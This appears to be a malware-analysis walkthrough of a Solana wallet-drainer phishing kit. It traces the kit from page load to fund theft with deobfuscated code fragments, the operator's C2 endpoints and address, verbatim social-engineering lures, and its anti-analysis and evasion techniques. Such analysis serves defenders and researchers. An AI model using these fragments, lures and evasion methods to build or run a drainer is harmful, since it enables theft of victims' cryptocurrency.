# Execution Flow — Annotated Step-by-Step

Full walk-through of the kit from page load to transfer completion,
with actual deobfuscated code fragments and variable names from `identifier_map.md`.

---

## Entry Point

The bundle's outermost wrapper:
```js
globalThis._t54h = import.meta;
Function("拀", "...")(拀_arg);
```

The inner IIFE:
1. Calls `铴(encodedTable, salt1, salt2)` to initialise the string table
2. Populates `CONSTS[]` (1691 entries)
3. Declares all top-level variables in a single `var` statement (all CJK names)
4. Runs `籨()` via `addEventListener("load", initApp)`

---

## Phase 1 — Page Load (`籨` / initApp)

```js
window.addEventListener("load", () => {
  initApp(component, lureConfig);
});
```

What `initApp` does:
1. Reads operator configuration from `jxi33.js` (a small script loaded by the HTML)
2. Calls `initLocale()` → `fetchLocale()` — tries to fetch localized `NOTIFY_STRINGS` from the fake-wallet backend (`/c/i` path via `fwcInstance.bn`)
3. Calls POST `/api/visit` via `c2Fetch` — registers the page visit with the operator panel
4. Calls `mountWalletSelector(component, lureConfig)` — renders the WalletConnect modal

POST `/api/visit` body (approximate):
```json
{
  "ts": <unix_ms>,
  "ref": <document.referrer>,
  "ua": <navigator.userAgent>,
  "lang": <navigator.language>,
  "tz": <Intl.DateTimeFormat().resolvedOptions().timeZone>
}
```

---

## Phase 2 — Wallet Modal (`辇` / mountWalletSelector)

The modal uses `@reown/appkit` (WalletConnect v2). The kit:

1. Passes the full `@reown/appkit` wallet list (populated from `decoded_strings.json[217..507]` — Solflare, Phantom, OKX, Trust, etc.)
2. **Injects three alt clients** at the end of the list:

```js
// Volsungar (id6757104054 on App Store, by "Asgarbyte")
{
  id: getString(999),    // "com.volsungar.wallet"
  name: "Volsungar",
  appStore: "https://apps.apple.com/app/id6757104054",
  deepLink: "alt-backend/app-link/" + walletAddress
}

// SOC Wallet (by "SOC JOINT STOCK")
{
  id: getString(992),    // "socwallet://"
  name: "SOC Wallet",
  deepLink: getString(986) + walletAddress
}

// Hero Wallet (by "PAYEXCHANGE")
{
  id: getString(1002),   // "herowallet://wc"
  name: "Hero Wallet",
  deepLink: getString(1003) + walletAddress
}
```

The `alt-backend/app-link/` deep-link opens the alt client directly with the victim's wallet address pre-filled, sending it to the SaaS backend.

---

## Phase 3 — Wallet Connection Handler

When a wallet connects, the WalletConnect adapter (`嗴` / WalletAdapterClass) fires an event. The kit:

```js
// From the wallet connect event handler (simplified):
async onWalletConnect(walletName, walletPublicKey, signAllTxFn) {
  let wallet = new WalletInstance(walletName, walletPublicKey, signAllTxFn, context);
  appContext = new AppContext(wallet, component);
  
  let timer = showLoadingTimeout(500);  // show loading spinner after 500ms
  let isKnown = await checkBanned(appContext);  // GET /is-banned
  
  if (!excludedWallets.includes(walletName)) {
    timer();                // cancel spinner
    if (!isKnown && !appContext.isBanned) {
      bannedWallets.set(1, appContext);     // track
      startDrain();                         // → Phase 4
    }
  }
}
```

---

## Phase 4 — Ban Check (`区` / checkBanned)

```js
async function checkBanned(ctx) {
  // GET /<C2_PATH_PREFIX>/is-banned
  // User-Agent: <walletAddress>
  // Authorization: Bearer <randomToken>
  let result = await c2Fetch("is-banned");
  return result === "1";   // "1" = this wallet is a known researcher/honeypot
}
```

If banned → kit does nothing. The ban list is maintained server-side.

---

## Phase 5 — Asset Enumeration

Before building transactions, the kit enumerates all assets. This happens in parallel:

### 5a. SOL Balance
```js
// via Solana RPC (姍 proxy → 恞 RpcClient → Helius)
let {value: lamports} = await solana.getBalance([walletAddress, {commitment: "confirmed"}]);
solBalance = lamports;
// if lamports < 8_000_000 (0.008 SOL): show "insufficient balance" error
```

### 5b. SPL Token Portfolio
```js
// GET https://wallet-api.solflare.com/v3/portfolio/tokens/<walletAddress>
// ?enablePartialErrors=true
let portfolio = await solflareInstance.getPortfolio(walletAddress);
// Returns: [{mint, symbol, decimals, amount, usdValue}, ...]
// Filtered to tokens with usdValue > threshold
```

### 5c. High-Liquidity Token Filter
```js
// GET https://wallet-api.solflare.com/v2/swap/capped-tokens?currency=USD
// Returns: set of mints that are liquid enough to swap via Jupiter
let swappable = await solflareInstance.getSwappableTokens();
// Cross-reference with portfolio → prioritize swappable tokens
```

### 5d. Stake Accounts
```js
// via RPC: getProgramAccounts(StakeProgramId, {filters: [{memcmp: {offset:44, bytes: walletAddress}}]})
// Returns: [{pubkey, lamports, state: active/activating/inactive/deactivating}]
// Only transfer if lamports / 1e9 >=斺 (1 SOL minimum)
```

### 5e. NFTs
```js
// GET tokens/v2/search?query=<walletAddress>
//   &network=mainnet&currency=USD&B3ui3QZFrOPoGW7oMZgE4A=true
// Returns token list including NFTs with collection floor prices
```

### Asset Priority Sorting
Assets are sorted by USD value descending. Order:
1. High-value SPL tokens (USDC, USDT, etc.)
2. SOL balance
3. Swappable tokens (via Jupiter)
4. NFTs
5. Stake accounts

---

## Phase 6 — Sign-In Message

Before any transactions, the kit presents a **fake sign-in message**:

```
"<site> wants you to sign in with your Solana account

Welcome to our DApp. Signing is the only way we can truly know that
you are the owner of the wallet you are connecting. Signing is a safe,
gas-less transaction that does not in any way give us permission to
perform any transactions with your wallet.

URI: https://<site>"
```

This uses `solana:signMessage` (WalletConnect v2 method). The signed message is:
- Sent to POST `/c/i` as proof-of-control
- Used to verify the wallet is live and signing-capable before wasting RPC calls

---

## Phase 7 — Transaction Construction

### v0 (Versioned) Transaction Structure

All transfer transactions use Solana's **v0 transaction format** with **Address Lookup Tables (ALTs)**:

```
Message Header:
  numRequiredSignatures:          1
  numReadonlySignerAccounts:      0
  numReadonlyNonSignerAccounts:   N

Static Account Keys:
  [0] victimPublicKey              (signer + fee payer)
  [1] ComputeBudget program        "ComputeBudget111111111111111111111111111111"
  [2] Token program                "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA"
  [3] Token-2022 program           "TokenzQdBNbLqP5VEhdkAS6EPFLC1PHnBqCXEpPxuEb"
  [4] ATA program                  "ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL"
  [5] SystemProgram                "11111111111111111111111111111111"
  ... (token mints, ATAs from ALT)

Address Lookup Tables:
  - operatorLookupTableAddress: contains receiver ATAs for all transferred tokens
    (pre-created by operator — reduces tx size by using 1-byte ALT indices)

Compiled Instructions:
  [0] ComputeBudget::SetComputeUnitLimit  { units: <computed> }
  [1] ComputeBudget::SetComputeUnitPrice  { microLamports: <priority_fee> }
  [2] Token::TransferChecked {
        source:      victimTokenAccount  (from ALT)
        mint:        tokenMint           (from ALT)
        destination: operatorTokenAccount (from ALT)
        owner:       victimPublicKey     (signer)
        amount:      fullTokenBalance
        decimals:    tokenDecimals
      }
  ... (one TransferChecked per token)
  [N] Memo::Write { data: base64("vendor-ref" + "USDC\0\0") }  ← WATERMARK
```

### SOL Transfer Transaction
```
Instructions:
  [0] ComputeBudget::SetComputeUnitLimit  { units: 300 }
  [1] ComputeBudget::SetComputeUnitPrice  { microLamports: <priority> }
  [2] SystemProgram::Transfer {
        from:    victimPublicKey
        to:      operatorAddress  "6cwsqBqmRy22Qa2SEuZ8tWrpKoCS9M8S2r8ct8VuqFmj"
        lamports: balance - reserveForFees
      }
```

### Priority Fee Calculation
```js
// 綾 = 1,400,000 microlamports total budget
// Split across all instructions
// Higher value = faster inclusion = operator gets tokens before victim notices
let priorityFee = Math.ceil(綾 / instructionCount);
```

### Jupiter Swap Flow (for illiquid tokens)
```js
// Step 1: Get quote
// GET https://quote-api.jup.ag/v6/quote
//   ?inputMint=<tokenMint>
//   &outputMint=So11111111111111111111111111111111111111112  (Wrapped SOL)
//   &amount=<fullBalance>
//   &slippageBps=5000   (50% — operator doesn't care)
//   Authorization: Bearer <jupiterApiKey>

// Step 2: Get swap transaction
// POST https://api.jup.ag/ with quote response
// Returns: base64 versioned transaction

// The swap tx has victim as signer, operator as destination
// Built by Jupiter, signed by victim via signAllTransactions
```

---

## Phase 8 — `signAllTransactions` Call

This is the core attack primitive. After all transactions are built:

```js
// wallet.Pt = the wallet adapter's signAllTransactions function
let signedTxs = await wallet.Pt([
  solTransferTx,      // transfer SOL
  token1TransferTx,   // transfer USDC
  token2TransferTx,   // transfer BONK
  stakeUnstakeTx,     // unstake SOL
  jupiterSwapTx,      // swap illiquid tokens
  ...
]);
```

The wallet shows **one approval dialog** for all transactions. The dialog shows:
- Number of transactions: N
- Each transaction summary (abbreviated)

The social engineering strings shown before this dialog:
```
"This dApp uses Abuse Protection to prevent misuse of platform.
You'll need to complete a quick verification of your transaction history.
It's completely safe and only takes a few seconds."
```

If the user rejects:
```
"The transaction has expired. Please sign it one more time to continue."
"Please allow one more verification step."
```
→ Kit regenerates transactions (new blockhash) and retries up to 3 times (`亊` = 3).

---

## Phase 9 — Broadcast

Signed transactions are NOT broadcast from the browser. Instead:

```js
// POST /<C2_PATH_PREFIX>/process
// User-Agent: <walletAddress>
// Authorization: Bearer <token>
// Body: { transactions: [base64(tx1), base64(tx2), ...] }
```

The backend broadcasts via Helius `sendTransaction`. Why:
- Bypasses any second-confirmation the browser wallet might show for `sendTransaction`
- Gives the backend control over retry/priority-fee bumping
- Keeps the victim's browser clean (no suspicious network traffic to Solana nodes)

The POST `/process` path includes `C2_PATH_PREFIX` = `ab060a03-7874-4647-84d1-da019e4b51ea`:
```
POST https://target-sample/ab060a03-7874-4647-84d1-da019e4b51ea/process
```

---

## Phase 10 — API Notifications (Telegram)

The kit sends notifications at each stage via POST to its api endpoints:

| Timing | Endpoint | Payload |
|--------|---------|---------|
| After connect | POST `/c/i` | `buildAssetSummary()` → wallet address + asset values |
| Before broadcast | POST `/c/c/` | `buildConnectNotif()` |
| After broadcast | POST `/c/f/` | `buildTxNotif(walletAddr)` → includes vendor-ref watermark |
| On error | POST `/api/handler` | Error details |

Notification format (sent as JSON to C2, forwarded to Telegram by backend):
```json
{
  "Description: ": "/c/c/",
  "‌/c/f/:": "✅ text/plain\n✅ https://wallet-api.solflare.com/\n🚫 v2/swap/..."
}
```

The zero-width characters (`​`, `‌`) in the keys are intentional — they create invisible separators in Telegram's message rendering.

---

## Phase 11 — Cover Story

After the transactions are submitted, the user sees:

```
"Transaction was reverted, funds will be refunded soon. Please try again."
```

This:
1. Keeps the user on the page (maybe they'll try again)
2. Explains why their balance is now empty ("it'll come back")
3. Delays the user from checking their actual wallet for 30–60 seconds while transactions confirm

If the user disconnects and reconnects a different wallet:
```
"This account is used as target account. Please connect another"
```
(Shown if the wallet is in the `excludedWallets` set — protects operator's own addresses.)

---

## Slot / Blockhash Management

Solana transactions expire after ~150 slots (~60–90 seconds). The kit maintains a **cached recent slot** to construct valid blockhashes without hammering the RPC:

```js
// 窋(slot) → caches slot + timestamp
// 殉(maxAgeSeconds) → returns cached slot if fresh, else fetches new one
// 陣() → returns current epoch number (slot / 432_000)

async function getSlot(maxAge = 60) {
  let age = Date.now() - (cacheTimestamp ?? 0);
  if (cachedSlot && age < maxAge) {
    // interpolate slot from elapsed time (鲽 = 0.2 slots/ms)
    return Math.trunc(cachedSlot + age / 0.2);
  }
  // Fetch fresh slot from RPC
  let slot = await solana.getSlot({commitment: "finalized"});
  cacheSlot(slot);
  return slot;
}
```

This reduces RPC calls and makes the timing less detectable.

---

## WalletConnect v2 Methods Used

| Method | Standard? | Use |
|--------|-----------|-----|
| `solana:signMessage` | Yes | Sign-in proof message |
| `solana:signTransaction` | Yes | Individual transaction signing |
| `solana:signAllTransactions` | Yes | Batch transaction signing (the attack) |
| `sol_signAllTransactions` | Solana Mobile | Same but for mobile wallet apps |
| `experimental:signMessage` | Non-standard | Fallback for some wallets |

---

## Cryptographic Primitives Used

| Function | Purpose |
|---------|---------|
| `AES-GCM decrypt` (`捿`) | Decrypt operator config payload (key from `jxi33.js`) |
| `generateBearer` (`濛`) | Generate fake UUID bearer token |
| `base64Decode` (`磕`) | Custom alphabet base64 decoder (used for strings AND tx data) |
| `base64Encode` (`緈`) | Custom alphabet base64 encoder (used for bearer tokens) |
| `randomBytes` (`憘`) | Crypto.getRandomValues wrapper |
| `randomInt` (`踳`) | Bounded random integer |

---

## Anti-Analysis Techniques Summary

| Technique | Implementation |
|----------|--------------|
| CJK identifier renaming | 200+ unique CJK chars for all function/variable names |
| Custom base64 alphabet | Non-standard 64-char alphabet; standard decoders fail |
| String table encoding | 1053 strings encoded; decoded on first access |
| Constants array | 1691 values stored in `CONSTS[]`; accessed by offset |
| Control-flow flattening | Every function: `while(true) { switch(s1+s2) { ... } }` |
| Dead-code injection | Unreachable `case` branches throughout all functions |
| String splitting | `"fetch"` → `"fet"+"ch"`, `"log"` → `"l"+"og"` etc. |
| Dynamic global lookup | `樶("key")` replaces all global/window references |
| Outer `Function()` wrapper | Outer scope is itself a `new Function(...)` call |
| Secret URL prefix | api routes hidden behind UUID path segment |
| Ban list | Server-side list of researcher wallets; serves no content to known analysts |
| TDS redirect | tds-proxy filters bots and Chinese IPs before serving the kit |
